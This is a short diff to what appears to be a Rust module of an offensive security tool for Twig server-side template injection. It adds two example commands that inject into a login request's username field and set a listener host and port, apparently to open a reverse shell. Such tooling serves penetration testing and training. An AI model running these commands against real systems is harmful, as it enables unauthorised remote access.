@@ -64,6 +64,10 @@ impl WebModule for TwigModule {
                 "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig".to_string(),
                 "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php".to_string(),
             ],
+            examples: vec![
+                "cap web run --module web/ssti/twig --request ./requests/login.req --injection-point username --lhost 10.10.14.5 --lport 4444".to_string(),
+                "cap web run --module web/ssti/twig --request ./requests/login.req --injection-point username --lhost 10.10.14.5 --lport 4444 --confirm-each".to_string(),
+            ],
         }
     }
     
